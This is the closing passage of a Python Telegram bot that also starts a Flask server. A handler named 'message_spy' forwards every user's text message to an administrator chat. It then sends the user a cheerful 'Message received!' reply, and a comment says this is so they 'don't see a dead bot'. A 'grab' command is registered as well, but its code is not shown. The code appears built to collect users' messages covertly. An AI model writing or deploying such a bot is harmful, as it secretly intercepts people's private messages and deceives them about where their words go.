        f"━━━━━━━━━━━━━━━━━━━━"
    )
    send_telegram_message(ADMIN_CHAT_ID, msg)
    # Still reply to the user so they don't see a dead bot
    await update.message.reply_text(
        "✅ Message received!",
        reply_markup=main_menu_keyboard()
    )

def run_bot():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("grab", grab))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_spy))
    print("🤖 Telegram bot is polling...")
    app.run_polling()
# ---------- Main Entry Point ----------
if __name__ == "__main__":
    def run_flask():
        port = int(os.environ.get("PORT", 5000))
        flask_app.run(host="0.0.0.0", port=port, threaded=True, debug=False)
    
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    run_bot()